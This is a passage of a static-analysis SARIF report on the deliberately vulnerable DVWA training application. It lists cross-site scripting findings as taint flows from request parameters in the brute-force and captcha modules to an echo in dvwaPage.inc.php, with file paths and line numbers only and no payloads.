                "text" : "high.php:29 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:9 - stripslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:9 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:10 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:10 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:29 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:9 - stripslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:9 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:10 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:10 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:29 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4624",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "A5DB5EAB6985B89EF05792194976CCE3"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Read $_POST['password_new']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Read $_POST['password_new']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Assignment to $pass_new"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Read $_POST['password_new']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Read $_POST['password_new']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Assignment to $pass_new"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Read $_POST['password_new']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Read $_POST['password_new']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Assignment to $pass_new"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Read $_POST['password_new']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Read $_POST['password_new']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Assignment to $pass_new"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Read $_POST['password_new']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Read $_POST['password_new']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Assignment to $pass_new"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4628",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "ABCC9A8B94CD3047D11C8D01567C53E4"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_POST['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_POST['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - stripslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:67 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:68 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:3 - impossible.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - impossible.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_POST['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_POST['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - stripslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:67 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:68 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
